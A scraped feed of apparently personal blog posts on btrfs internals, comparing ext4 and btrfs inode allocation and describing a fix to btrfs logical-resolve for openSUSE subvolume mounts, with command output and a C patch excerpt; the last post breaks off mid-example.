Filesystem Inodes IUsed IFree IUse% Mounted on /dev/loop0 327680 11 327669 1% /mnt $ mount -l | grep sda2 /dev/sda2 on / type btrfs (rw,relatime,ssd,space_cache=v2,subvolid=266,subvol=/@/.snapshots/1/snapshot) $ df -i / Filesystem Inodes IUsed IFree IUse% Mounted on /dev/sda2 0 0 0 - / Why btrfs always shows the number of available inodes as zero? This aspect tells a lot about how btrfs manages its physical space.\nFilesystems like ext4 allocate the entire disk on filesystem creation time, creating block groups all over the available space. This means that once the spaces for data and metadata are defined, they cannot be changed after the filesystem is in use, as there isn\u0026rsquo;t a way to extend them: they have fixed offsets. Let\u0026rsquo;s take a look how it works for ext4.\nExt4: block sizes and block groups In filesystems, a block is a group of sectors (512 bytes) and it\u0026rsquo;s the smaller unit of data managed by the filesystem. The block size affects all other filesystem structures, specially in filesystems like ext4 for example. By the block size we can say how many inodes and how much space a ext4 filesystem can manage. Ext4 accepts block sizes of 1k, 2k, 4k and 64k.\nA block group, as the name implies, is a collection of blocks, and many filesystems manage their spaces using block groups. Ext4 divides the entire disk into block groups when creating the filesystem and its size is defined by the block size. By default, ext4 uses blocks of 4k of size. Ext4 stores both data and metadata in a block group.\nFrom now on we\u0026rsquo;ll make the calculations based in a block size of 4k (4096 bytes).\nTo track which blocks are used in a block group, ext4 reserves one block of the block group to store a bitmap. Each bit of the bitmap will track one block of the block group, meaning that we can map up to 128mb of space:\n4096 bytes * 8bits: 32768 bits 32768 bits can map 32768 blocks of 4k 32768 * 4k: 134217728 bytes: 128Mb Let\u0026rsquo;s take a look in how ext4 divides a 5G disk, using the default 4k block sizes:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 # create a 5G file to be used as disk $ fallocate -l5g ext4.disk # create the ext4 filesystem on it $ mkfs.ext4 ext4.disk mke2fs 1.43.8 (1-Jan-2018) Discarding device blocks: done Creating filesystem with 1310720 4k blocks and 327680 inodes Filesystem UUID: e408e28f-f275-49c6-87e8-18104fe31ba4 Superblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912, 819200, 884736 Allocating group tables: done Writing inode tables: done Creating journal (16384 blocks): done Writing superblocks and filesystem accounting information: done # print some information about the created filesystem $ dumpe2fs ext4.disk dumpe2fs 1.43.8 (1-Jan-2018) Filesystem volume name: \u0026lt;none\u0026gt; Last mounted on: \u0026lt;not available\u0026gt; Filesystem UUID: e408e28f-f275-49c6-87e8-18104fe31ba4 Filesystem magic number: 0xEF53 Filesystem revision #: 1 (dynamic) Filesystem features: has_journal ext_attr resize_inode dir_index filetype extent 64bit flex_bg sparse_super large_file huge_file uninit_bg dir_nlink extra_isize Filesystem flags: signed_directory_hash Default mount options: user_xattr acl Filesystem state: clean Errors behavior: Continue Filesystem OS type: Linux Inode count: 327680 Block count: 1310720 Reserved block count: 65536 Free blocks: 1268642 Free inodes: 327669 First block: 0 Block size: 4096 Fragment size: 4096 Group descriptor size: 64 Reserved GDT blocks: 639 Blocks per group: 32768 Fragments per group: 32768 Inodes per group: 8192 Inode blocks per group: 512 Flex block group size: 16 Filesystem created: Wed Aug 4 00:24:49 2021 ... First inode: 11 Inode size: 256 ... Group 0: (Blocks 0-32767) csum 0xcef6 [ITABLE_ZEROED] Primary superblock at 0, Group descriptors at 1-1 Reserved GDT blocks at 2-640 Block bitmap at 641 (+641) Inode bitmap at 657 (+657) Inode table at 673-1184 (+673) 23897 free blocks, 8181 free inodes, 2 directories, 8181 unused inodes Free blocks: 8871-32767 Free inodes: 12-8192 Group 1: (Blocks 32768-65535) csum 0x4873 [INODE_UNINIT, BLOCK_UNINIT, ITABLE_ZEROED] Backup superblock at 32768, Group descriptors at 32769-32769 Reserved GDT blocks at 32770-33408 Block bitmap at 642 (bg #0 + 642) Inode bitmap at 658 (bg #0 + 658) Inode table at 1185-1696 (bg #0 + 1185) 32127 free blocks, 8192 free inodes, 0 directories, 8192 unused inodes Free blocks: 33409-65535 Free inodes: 8193-16384 ... Group 39: (Blocks 1277952-1310719) csum 0x71eb [INODE_UNINIT, ITABLE_ZEROED] Block bitmap at 1048583 (bg #32 + 7) Inode bitmap at 1048591 (bg #32 + 15) Inode table at 1052176-1052687 (bg #32 + 3600) 32768 free blocks, 8192 free inodes, 0 directories, 8192 unused inodes Free blocks: 1277952-1310719 Free inodes: 319489-327680 The output of mkfs.ext4 was reduced because it\u0026rsquo;s too long. The output above gives a general idea about how the filesystem is organized. From now on this post will describe how these values are calculated, and why they were chosen by ext4.\nAs ext4 manages its spaces using block groups, and with 4k block sizes we can have a block group mapping up to 128Mb of space, mkfs.ext4 needed to create 40 block groups:\n5G of space / 128mb block group size: 40 block groups Ext4: inodes As mentioned before ext4 uses a reserved block in a block group to track the used blocks. This is also true for inodes. There is a reserved block per block group used as an inode bitmap to track allocated inodes. By using the same math, the inode bitmap can track up to 32768 inodes.\nAlong with the inode bitmap, we also need to store the inode metadata (size, owner, file size, etc). There is a space in the block group to store the inode metadata, and it\u0026rsquo;s separated from the file\u0026rsquo;s data.\nAs each block group is allocated when creating the filesystem, and inode metadata has to have a separated space within the block group (called inode table) it needs to calculate the necessary space to store the metadata.\nIf a big amount of space is used to store inode metadata, the filesystem would be able to create more files, but the available space for file content (data) would be reduced. On the other hand, creating a small inode table allows the user to store more data, but with a reduced number of files. To address these limits, mkfs.ext4 uses a configuration called inode-ratio which defines the number of inodes proportional to the storage space. The default inode-ratio is 16k (described in mke2fs.conf file).\nUsing our 5G disk as before and the inode-ration, we can calculate the maximum number of inodes this filesystem can store:\n5G of storage / 16k: 327680 inodes 327680 inodes / 40 block groups: 8192 These values match the output from mkfs.ext4 shown before.\nThe inode table needs to known how much space will be used to store the inode metadata for each inode in the filesystem. Ext4 uses 256 bytes as default inode size (also described in mke2fs.conf file), so for each block group it will use 2Mb of space for the inode table:\n8192 inodes x 256 bytes per inode: 2Mb (2097152 bytes) To compare the numbers, just mount the filesystem created before and use df to show the maximum number of inodes:\n1 2 3 4 5 6 7 $ mount ext4.disk /tmp/ext4 $ df -i /tmp/ext4 Filesystem Inodes IUsed IFree IUse% Mounted on /dev/loop0 327680 11 327669 1% /tmp/ext4 $ ls -i /tmp/ext4 11 lost+found Ext4 reserves the inode numbers from 0 to 10 for special purposes, and the first usable one is for the lost+found. This is a special purpose directory for the ext4 filesystem. All user files start from inode 12.\nFor more information about ext4 block group please check the official ext4 documentation here.\nWhat about btrfs? Btrfs allocates its structures dynamically. From block groups to internal structures and inodes, btrfs allocates them on demand.\nBtrfs: block groups Btrfs also uses block groups to manage the filesystem space, but each block group will store data OR metadata, not both. On filesystem creation time we can specify the block groups to be mixed, containing both data and metadata, but it\u0026rsquo;s not recommended.\nWhen creating a filesystem btrfs creates a block group to store data, one to store metadata, and one system block group. A data block group (usually) takes 1G of size, while the metadata one can take 256Mb if the filesystem is smaller than 50G, and 1G if bigger. The system block group usually takes up to some megabytes. For small filesystems, the block group sizes cannot be more than 10% of the filesystem size, so it can smaller than 1G as stated before. All the remaining space is left there to be allocated when necessary.\nDifferently from ext4, btrfs allocates block groups on demand. If the workload is focused on data (bigger files), more data block groups will be allocated from the free space. In the same way, if the workload is creating more metadata (doing snapshots for example) more metadata block groups will be allocated.\nLet\u0026rsquo;s see an example:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # create a 55G file to be used as disk $ fallocate -l55g btrfs.disk # Create the filesystem on top of it $ mkfs.btrfs -f /storage/btrfs.disk btrfs-progs v5.10.1 See http://btrfs.wiki.kernel.org for more information. Label: (null) UUID: 8f9303a9-15cd-4709-848e-38f80b5b2985 Node size: 16384 Sector size: 4096 Filesystem size: 55.00GiB Block group profiles: Data: single 1.00GiB Metadata: DUP 1.00GiB System: DUP 8.00MiB SSD detected: no Zoned device: no Incompat features: extref, skinny-metadata Runtime features: Checksum: crc32c Number of devices: 1 Devices: ID SIZE PATH 1 55.00GiB /storage/btrfs.disk If your filesystem reports a different data block group as being of 8M, it\u0026rsquo;s because of this issue that was reported, but maybe not yet fixed. It\u0026rsquo;s important to understand that these numbers reflect the allocation strategy for single profile. For raid setups, these numbers can be different.\nAlso, the block group sizes doesn\u0026rsquo;t affect the number of maximum number of inodes that can be created, as we\u0026rsquo;ll see later.\nWe can inspect the block groups by using the btrfs tool:\n1 2 3 4 5 6 7 8 $ btrfs inspect-internal dump-tree -t extent /storage/btrfs.disk | grep -A1 BLOCK_GROUP item 0 key (1078984704 BLOCK_GROUP_ITEM 1073741824) itemoff 16259 itemsize 24 block group used 0 chunk_objectid 256 flags DATA item 1 key (2152726528 BLOCK_GROUP_ITEM 8388608) itemoff 16235 itemsize 24 block group used 16384 chunk_objectid 256 flags SYSTEM|DUP ... item 4 key (2161115136 BLOCK_GROUP_ITEM 1073741824) itemoff 16145 itemsize 24 block group used 114688 chunk_objectid 256 flags METADATA|DUP The above command used the inspect-internal subcommand to dump the entire extent-tree. We can compare the block group sizes (the numbers after the BLOCK_GROUP_ITEM) in bytes that match we the previous mkfs.btrfs output. The profiles are also dumped and can be verified, being DUP for system and metadata.\nWhen we write more files, or if a file occupies more than 1G of data, more data block groups are created (the flags field shows the type of the block group):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # Creating a 2.5G file $ dd if=/dev/urandom of=/mnt/testing/file.bin bs=1M count=2500 $ sync # Check the new data block groups $ btrfs inspect-internal dump-tree -t extent /storage/btrfs.disk| grep -A1 BLOCK_GROUP item 0 key (1078984704 BLOCK_GROUP_ITEM 1073741824) itemoff 16259 itemsize 24 block group used 940572672 chunk_objectid 256 flags DATA .. item 13 key (2152726528 BLOCK_GROUP_ITEM 8388608) itemoff 15619 itemsize 24 block group used 16384 chunk_objectid 256 flags SYSTEM|DUP item 14 key (2161115136 BLOCK_GROUP_ITEM 1073741824) itemoff 15595 itemsize 24 block group used 2899968 chunk_objectid 256 flags METADATA|DUP .. item 192 key (3234856960 BLOCK_GROUP_ITEM 1073741824) itemoff 9730 itemsize 24 block group used 939524096 chunk_objectid 256 flags DATA .. item 201 key (4308598784 BLOCK_GROUP_ITEM 1073741824) itemoff 9282 itemsize 24 block group used 742391808 chunk_objectid 256 flags DATA We can see that new data block groups were created. If we remove the file, the used space is updated to reflect the file removal:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ rm /mnt/testing/file.bin $ sync $ btrfs inspect-internal dump-tree -t extent /storage/btrfs.disk| grep -A1 BLOCK_GROUP item 1 key (1078984704 BLOCK_GROUP_ITEM 1073741824) itemoff 16206 itemsize 24 block group used 1048576 chunk_objectid 256 flags DATA .. item 6 key (2152726528 BLOCK_GROUP_ITEM 8388608) itemoff 15990 itemsize 24 block group used 16384 chunk_objectid 256 flags SYSTEM|DUP item 7 key (2161115136 BLOCK_GROUP_ITEM 1073741824) itemoff 15966 itemsize 24 block group used 147456 chunk_objectid 256 flags METADATA|DUP .. item 17 key (3234856960 BLOCK_GROUP_ITEM 1073741824) itemoff 15645 itemsize 24 block group used 0 chunk_objectid 256 flags DATA item 18 key (4308598784 BLOCK_GROUP_ITEM 1073741824) itemoff 15621 itemsize 24 block group used 0 chunk_objectid 256 flags DATA Take a look in the block group use field, they are now zeroed. The block groups are still allocated, but a balance can remove the non used ones:\n1 2 3 4 5 6 7 8 9 10 11 $ btrfs balance start -dusage=0 /mnt/testing Done, had to relocate 0 out of 3 chunks $ btrfs inspect-internal dump-tree -textent /storage/btrfs.disk | grep -A 1 BLOCK_GROUP item 0 key (1078984704 BLOCK_GROUP_ITEM 1073741824) itemoff 16259 itemsize 24 block group used 524288 chunk_objectid 256 flags DATA .. item 3 key (2152726528 BLOCK_GROUP_ITEM 8388608) itemoff 16129 itemsize 24 block group used 16384 chunk_objectid 256 flags SYSTEM|DUP .. item 5 key (2161115136 BLOCK_GROUP_ITEM 1073741824) itemoff 16072 itemsize 24 block group used 147456 chunk_objectid 256 flags METADATA|DUP It shows only one data block group.\nBtrfs: inodes Btrfs does not use fixes inode bitmaps for inode allocation. As stated before, btrfs allocates internal items to manage its metadata. Each item is addressed by three values that together compose a key. These values are described as objectid, type and offset.\nThis is the fs tree right after the filesystem is created:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ btrfs inspect-internal dump-tree -t fs /storage/btrfs.disk btrfs-progs v5.16.1 fs tree key (FS_TREE ROOT_ITEM 0) leaf 30474240 items 2 free space 16061 generation 5 owner FS_TREE leaf 30474240 flags 0x1(WRITTEN) backref revision 1 fs uuid b62385e4-e0cc-497f-a220-29ae6465510d chunk uuid b3e0fa4d-fddb-40b3-bd9c-349df8095b39 item 0 key (256 INODE_ITEM 0) itemoff 16123 itemsize 160 generation 3 transid 0 size 0 nbytes 16384 block group 0 mode 40755 links 1 uid 0 gid 0 rdev 0 sequence 0 flags 0x0(none) atime 1650811378.0 (2022-04-24 11:42:58) ctime 1650811378.0 (2022-04-24 11:42:58) mtime 1650811378.0 (2022-04-24 11:42:58) otime 1650811378.0 (2022-04-24 11:42:58) item 1 key (256 INODE_REF 256) itemoff 16111 itemsize 12 index 0 namelen 2 name: .. There are two items in the listing, and the two refer to the top level directory. The INODE_ITEM item contains data about the inode, owner, size and etc. Its key is always (inode_number INODE_ITEM 0), and 256 is the first inode number used in a filesystem tree.\nThe INODE_REF item maps an inode to its parent directory (inode_number INODE_REF parent_dir_inode). In this case it points to itself since the top level directory ancestor is itself.\nBy creating a file, we can see more structures being allocated:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ touch /mnt/testing/file.txt $ sync $ btrfs inspect-internal dump-tree -t fs /storage/btrfs.disk ... item 2 key (256 DIR_ITEM 3956591618) itemoff 16073 itemsize 38 location key (257 INODE_ITEM 0) type FILE transid 9 data_len 0 name_len 8 name: file.txt item 3 key (256 DIR_INDEX 2) itemoff 16035 itemsize 38 location key (257 INODE_ITEM 0) type FILE transid 9 data_len 0 name_len 8 name: file.txt item 4 key (257 INODE_ITEM 0) itemoff 15875 itemsize 160 generation 9 transid 9 size 0 nbytes 0 block group 0 mode 100644 links 1 uid 0 gid 0 rdev 0 sequence 10 flags 0x0(none) atime 1650811865.463886516 (2022-04-24 11:51:05) ctime 1650811865.463886516 (2022-04-24 11:51:05) mtime 1650811865.463886516 (2022-04-24 11:51:05) otime 1650811865.463886516 (2022-04-24 11:51:05) item 5 key (257 INODE_REF 256) itemoff 15857 itemsize 18 index 2 namelen 8 name: file.txt A new INODE_ITEM was allocated for file.txt, using the inode number 257. The new INODE_REF item\u0026rsquo;s offset points to 256, which is the top level directory, as expected.\nTwo new items are also allocated: DIR_ITEM and DIR_INDEX. DIR_INDEX is used for directory listing, like readdir for example. Its key (parent_dir_inode DIR_INDEX pos) almost explains itself. The pos value says it\u0026rsquo;s the third file created in the directory, as values 1 and 2 are related to \u0026lsquo;.\u0026rsquo; and \u0026lsquo;..\u0026rsquo; respectively. DIR_ITEM is used for searching. Its offset value is the filename hashed, making it quick to find a file by name inside a directory.\nAs the file grows, more item are created:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 $ dd if=/dev/urandom of=/mnt/testing/file.txt bs=1M count=500 $ sync $ btrfs inspect-internal dump-tree -t fs btrfs.disk ... item 6 key (257 EXTENT_DATA 0) itemoff 15804 itemsize 53 generation 12 type 1 (regular) extent data disk byte 1104150528 nr 134217728 extent data offset 0 nr 134217728 ram 134217728 extent compression 0 (none) item 7 key (257 EXTENT_DATA 134217728) itemoff 15751 itemsize 53 generation 12 type 1 (regular) extent data disk byte 1238368256 nr 134217728 extent data offset 0 nr 134217728 ram 134217728 extent compression 0 (none) item 8 key (257 EXTENT_DATA 268435456) itemoff 15698 itemsize 53 generation 12 type 1 (regular) extent data disk byte 1372585984 nr 134217728 extent data offset 0 nr 134217728 ram 134217728 extent compression 0 (none) item 9 key (257 EXTENT_DATA 402653184) itemoff 15645 itemsize 53 generation 12 type 1 (regular) extent data disk byte 1506803712 nr 90177536 extent data offset 0 nr 90177536 ram 90177536 extent compression 0 (none) item 10 key (257 EXTENT_DATA 492830720) itemoff 15592 itemsize 53 generation 12 type 1 (regular) extent data disk byte 1596981248 nr 1048576 extent data offset 0 nr 1048576 ram 1048576 extent compression 0 (none) item 11 key (257 EXTENT_DATA 493879296) itemoff 15539 itemsize 53 generation 12 type 1 (regular) extent data disk byte 1598029824 nr 30408704 extent data offset 0 nr 30408704 ram 30408704 extent compression 0 (none) ... New EXTENT_DATA items are created to manage the data related to user files. The objectid of the EXTENT_DATA\u0026rsquo;s key informs to which inode the data is associated.\nMore data about btrfs item can be found in this document.\nWhy can\u0026rsquo;t btrfs show how many inodes it can hold? Because it\u0026rsquo;s impossible to known beforehand.\nThe same metadata block group space is used to store INODE_ITEM, EXTENT_DATA and all other metadata items. So if a workload creates bigger files, it ends ups creating more EXTENT_DATA items, which can end up consuming a huge number of metadata block groups to manage extents.\nOn the other hand, if your workload ends up creating a huge number of small files, it would end up creating less EXTENT_DATA items, making it possible to store different items, including INODE_ITEMs, making it possible to create more files.\nThat\u0026rsquo;s the reason for the number of inodes cannot be checked by using df. The df tool uses the statfs system call to show the information about inodes. The system call populates the statfs struct with the values related to the filesystem being checked, and the f_files field contains the maximum number of inodes.\nBy looking at the kernel code, the function btrfs_statfs does not set buf-\u0026gt;f_files, while in ext4_statfs we can see the information being get from the superblock.\nBtrfs: Inodes and subvolumes In btrfs, subvolumes store user data, and act like different filesystems, as each subvolume can be mounted separately. It can be compared to a disk partition, but having much more features, like creating snapshots. openSUSE and SUSE Linux Enterprise (SLE) uses subvolumes to divide the filesystem into logic structures, and also to manage snapshots after each upgrade:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ btrfs subvolume list / [sudo] password for root: ID 256 gen 31 top level 5 path @ ID 257 gen 161195 top level 256 path @/var ID 258 gen 161097 top level 256 path @/usr/local ID 259 gen 64676 top level 256 path @/srv ID 260 gen 149398 top level 256 path @/root ID 261 gen 146119 top level 256 path @/opt ID 262 gen 161195 top level 256 path @/home ID 263 gen 150062 top level 256 path @/boot/grub2/x86_64-efi ID 264 gen 27 top level 256 path @/boot/grub2/i386-pc ID 265 gen 160386 top level 256 path @/.snapshots ID 266 gen 161162 top level 265 path @/.snapshots/1/snapshot ID 342 gen 110017 top level 265 path @/.snapshots/77/snapshot ID 343 gen 110254 top level 265 path @/.snapshots/78/snapshot ID 346 gen 112147 top level 265 path @/.snapshots/81/snapshot ID 347 gen 112149 top level 265 path @/.snapshots/82/snapshot ID 352 gen 113071 top level 265 path @/.snapshots/87/snapshot ID 353 gen 113100 top level 257 path @/var/lib/machines ... An interesting fact about subvolumes is that files always start from inode 257, and the same inode numbers are used in different subvolumes. Since each subvolume is a different tree inside btrfs, it\u0026rsquo;s not a problem for the end user. Let\u0026rsquo;s see an example of this happening:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $ mount /storage/btrfs.disk /mnt/testing $ btrfs subvolume create /mnt/testing/vol1 Create subvolume \u0026#39;/mnt/testing/vol1\u0026#39; $ btrfs subvolume create /mnt/testing/vol2 Create subvolume \u0026#39;/mnt/testing/vol2\u0026#39; # let\u0026#39;s create directories and files inside each subvolume $ touch /mnt/testing/vol1/file1 $ touch /mnt/testing/vol1/file2 $ mkdir /mnt/testing/vol2/dir1 $ touch /mnt/testing/vol2/filexx # let\u0026#39;s list the inodes of there files/direcotry $ ls -iR /mnt/testing /mnt/testing: 256 vol1 256 vol2 /mnt/testing/vol1: 257 file1 258 file2 /mnt/testing/vol2: 257 dir1 258 filexx /mnt/testing/vol2/dir1: From the output above we can see that both file1 and dir, and file2 and filexx have the same inode numbers.\nConsiderations Interested readers may want to take a look into the ext4 kernel documentation , the mke2fs documentation and the configuration file used by mke2fs for the default filesystem settings.\nBtrfs has a nice wiki page detailing how things work. Additional info can be get from the mkfs.btrfs utility man page and for the more curious readers, the btrfs-dev-docs details the inner parts of the filesystem.\nThe post got much bigger than I expected. The initial focus was to only mention about the kernel code setting the number of inodes in ex4, and the math involved to find the maximum number of inodes. While talking with some friends, it became more evident that more background would be more interesting. So that explains why block groups, subvolumes and everything in between was mentioned.\nThanks for reading!\n","permalink":"https://mpdesouza.com/blog/btrfs-for-mere-mortals-inode-allocation/","summary":"\u0026hellip; or how btrfs manages its inodes when compared to other Linux filesystems, from the inside.","title":"Btrfs for mere mortals: inode allocation"},{"content":"Tools like fsck and smartctl are usually used when something bad happens on your disk. But, what if such tools have a problem and also need to be fixed? Well, that\u0026rsquo;s what we are going to see today.\nThe command btrfs inspect-internal logical-resolve, as stated in a previous post, is useful when the btrfs filesystem reports a problem related to data consistency, for example:\n1 2 [2349645.383479] BTRFS error (device sda): bdev /dev/sda errs: wr 0, rd 0, flush 0, corrupt 19, gen 0 [2349645.383483] BTRFS error (device sda): unable to fixup (regular) error at logical 519704576 on dev /dev/sda Btrfs uses blocks groups and chunks to map logical and physical addresses, respectively. The logical address is needed since btrfs has built-in support for multi device and raid.\nTo find what is corruped, we need to find what is the file corresponding to the reported logical address, and this is what logical-resolve was designed to do. This tool is currently failing on some cases, as shown below:\n1 2 $ btrfs inspect-internal logical-resolve 519704576 / ERROR: cannot access \u0026#39;//@/home\u0026#39;: No such file or directory As we can see, the command returned -ENOENT and reported an odd path: \u0026rsquo;//@/home\u0026rsquo;. If you had a similar issue, this is most likely because you are using openSUSE/SLE as your Linux distribution, since these systems use @ as it\u0026rsquo;s top subvolume. For more details about the subvolume layout used in openSUSE check this post from Richard Brown.\nBy looking at the problematic path returned we can assume that logical-resolve is using the full subvolume path when searching for the file. This won\u0026rsquo;t work because the subvolume @ is not mounted, only it\u0026rsquo;s child subvolume home:\n1 2 $ mount -l | grep home /dev/sda2 on /home type btrfs (rw,relatime,ssd,space_cache,subvolid=263,subvol=/@/home) In this case the tool should start looking at /home, or in other words, it should be looking at where the subvolume is mounted, not at the subvolume path.\nResolving the resolver We can describe the functionality of logical-resolve in the following steps:\nExecute ioctl BTRFS_IOC_LOGICAL_INO to get all inodes related to the logical address (519704576 in our example), in the root filesystem (/ in our case) For each returned inode Call btrfs_list_path_for_root to get the subvolume path Concatenate the filesystem path (/ in our case) plus the returned subvolume path (/@/home in the example) Call btrfs_open_dir using the path create above (//@/home), returning an fd Call __ino_to_path_fd using the directory fd from btrfs_open_dir and the inode number If __ino_to_path_fd found a valid filename, print the full path (//@/home) plus the filename found. From the steps shown above we can see that step 2.3 will fail. The path /@ is not accessible, only /home. We can fix the problem by changing the behavior and getting the subvolue mount point instead of the subvolume path.\nAn astute reader would think that we can get wrong mount points too, like a bind mount that points to a directory within our desired mount point. This was fixed by the commit mentioned in a previous post.\nWith the bind mount problem resolved, the fixing is a matter of changing step 2.2, like what was done in this patch:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 char *mounted = NULL; char subvol[PATH_MAX]; char subvolid[PATH_MAX]; /* * btrfs_list_path_for_root returns the full * path to the subvolume pointed by root, but the * subvolume can be mounted in a directory name * different from the subvolume name. In this * case we need to find the correct mount point * using same subvolume path and subvol id found * before. */ snprintf(subvol, PATH_MAX, \u0026#34;/%s\u0026#34;, name); snprintf(subvolid, PATH_MAX, \u0026#34;%llu\u0026#34;, root); ret = find_mount_fsroot(subvol, subvolid, \u0026amp;mounted); if (ret) { error(\u0026#34;failed to parse mountinfo\u0026#34;); goto out; } if (!mounted) { printf( \u0026#34;inode %llu subvol %s could not be accessed: not mounted\\n\u0026#34;, inum, name); continue; } The new behavior searches for all currently mounted filesystems in order to find the correct mount point related to the subvolume name and subvolume id returned from the BTRFS_IOC_LOGICAL_INO ioctl. This is done by function find_mount_fsroot.\nWith the most recent version of btrfs-progs, logical-resolve works as expected:\n1 2 $ btrfs inspect-internal logical-resolve 5085913088 / //./home/marcos/.local/share/flatpak/repo/objects/00/7e3655177d55a02ca39d4cd3d095627f824b8004ad70f416eccb8bdd281fd5.file The package btrfs-progs v5.10 already contains the fixes pointed in this post, so make sure to upgrade your package in order to have a working logical-resolve.\nThanks for reading!\n","permalink":"https://mpdesouza.com/blog/btrfs-resolving-the-logical-resolve/","summary":"logical-resolve inside out","title":"Btrfs: Resolving the logical-resolve"},{"content":"The btrfs inspect-internal logical-resolve command is used to find a file related to a logical-address. This can be useful when btrfs reports a corruption at an specific logical address, making it easy for the user to find the corrupted file. But, for all current users of openSUSE/SUSE Enterprise Linux, this command was failing as shown below:\n1 2 btrfs inspect-internal logical-resolve 5085913088 / ERROR: cannot access \u0026#39;//@/home\u0026#39;: No such file or directory An openSUSE/SLE installation would create a set of subvolumes, starting from /@. These subvolumes are mounted on /, but @ is never mounted. For example, subvolume /@/home is mounted at /home. We can confirm this behavior by looking at the subvolume list:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ btrfs subvolume list / ID 256 gen 32 top level 5 path @ ID 257 gen 416148 top level 256 path @/var ID 258 gen 416148 top level 256 path @/usr/local ID 259 gen 416148 top level 256 path @/tmp ID 260 gen 405918 top level 256 path @/srv ID 261 gen 362296 top level 256 path @/root ID 262 gen 371476 top level 256 path @/opt ID 263 gen 416148 top level 256 path @/home ID 264 gen 131967 top level 256 path @/boot/grub2/x86_64-efi ID 265 gen 28 top level 256 path @/boot/grub2/i386-pc ID 266 gen 354001 top level 256 path @/.snapshots ID 267 gen 416148 top level 266 path @/.snapshots/1/snapshot ID 274 gen 53 top level 266 path @/.snapshots/2/snapshot ID 280 gen 2186 top level 266 path @/.snapshots/7/snapshot ... By checking the fstab file we can verify that all subvolumes are mounted at /, but starting from the subvolume \u0026lsquo;@\u0026rsquo;:\n1 2 3 4 5 $ cat /etc/fstab ... UUID=35b19e1f-efb2-49a5-ab93-03c04e6d0399 /opt btrfs subvol=/@/opt 0 0 UUID=35b19e1f-efb2-49a5-ab93-03c04e6d0399 /home btrfs subvol=/@/home 0 0 ... The code related to logical-address look at the full subvolume path (/@/home) and tries to follow it, but subvolume /@ isn\u0026rsquo;t mounted, returning an error. To address it, we need to find the exact mountpoint of the subvolume where the file is mounted, and show the path starting from it.\nThese two patches (patch 1, path 2) fix the issue: finding the correct mountpoint of a subvolume and using it to show the path to the file related to the logical-address.\nIn this post I\u0026rsquo;ll discuss about the first patch: how to reliably find the correct mountpoint related to a subvolume and a subvolume id.\nSearching for mounted subvolumes As btrfs mount options always show subvolume and subvolume id, it would be simple as:\n1 2 $ cat /proc/mounts | grep btrfs | grep \u0026#34;subvolid=5,subvol=/\u0026#34; /storage/btrfs/1.disk on /mnt type btrfs (rw,relatime,ssd,space_cache,subvolid=5,subvol=/) The command above searches in the /proc/mounts file which contain all mountpoints, source, target, filesystem type and filesystem options used to mount.\nIn this case, it works as expect, but what if we have a bind mount mounting from a directory within the current mountpoint? Look at the example below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # create a new disk, format it, create a subvolume and a directory on it $ fallocate -l5G test.disk $ mkfs.btrfs -f test.disk $ mount test.disk /mnt $ btrfs subvolume create /mnt/vol1 Create subvolume \u0026#39;/mnt/vol1\u0026#39; $ mount -o subvol=vol1 /mnt $ mkdir /mnt/dir1 $ cat /proc/mounts | grep btrfs | grep \u0026#34;subvolid=256,subvol=/vol1\u0026#34; /storage/btrfs/test.disk on /mnt type btrfs (rw,relatime,ssd,space_cache,subvolid=256,subvol=/vol1) $ umount /mnt # bind mount it $ mkdir another_mnt $ mount -o subvol=vol1 /mnt $ mount --bind /mnt/dir1 another_mnt Now, if we run the same command as before, we have a problem:\n1 2 3 $ cat /proc/mounts | grep btrfs | grep \u0026#34;subvolid=256,subvol=/vol1\u0026#34; /storage/btrfs/test.disk on /mnt type btrfs (rw,relatime,ssd,space_cache,subvolid=256,subvol=/vol1) /storage/btrfs/test.disk on /storage/btrfs/another_mnt type btrfs (rw,relatime,ssd,space_cache,subvolid=256,subvol=/vol1) As shown, the subvolid and subvol fields are the same, but the content isn\u0026rsquo;t:\n1 2 3 4 $ ls /mnt dir1 $ ls /storage/btrfs/another_mnt $ Prior to kernel 5.9-rc1, btrfs would show a diferent subvol= option when a bind mount was used. The issue was fixed by this patch. Before this change the /proc/mounts file would differentiate bind mounts:\n1 2 /dev/sda /mnt/test btrfs rw,relatime,subvolid=256,subvol=/foo 0 0 /dev/sda /mnt/test/baz btrfs rw,relatime,subvolid=256,subvol=/foo/bar 0 0 This was wrong, since the subvolume shown should be the same for a bind mount. The patch above fixed the behavior, and now a bind mount will show the same subvol and subvolid fields on a mountpoint:\n1 2 /dev/sda /mnt/test btrfs rw,relatime,subvolid=256,subvol=/foo 0 0 /dev/sda /mnt/test/baz btrfs rw,relatime,subvolid=256,subvol=/foo 0 0 As /proc/mounts can\u0026rsquo;t be used to differentiate bind mounts, how can we proceed?\nUsing /proc/\u0026lt;pid\u0026gt;/mountinfo There is a different proc file that shows all mountpoints, accessible by /proc/\u0026lt;pid\u0026gt;/mountinfo. The \u0026lt;pid\u0026gt; comes form the fact that the process can be in a different mount namespace. By using the pid the kernel knows which mountpoints are visible to the process. You can also use self if you want the mountpoints of the current process namespace.\nThe description of all mountinfo fields, along with the /proc/mounts one, can be see in the procfs manpage.\nWhat does mountinfo shows in this setup?\n1 2 3 cat /proc/self/mountinfo | grep btrfs | grep \u0026#34;subvolid=256,subvol=/vol1\u0026#34; 37 28 0:31 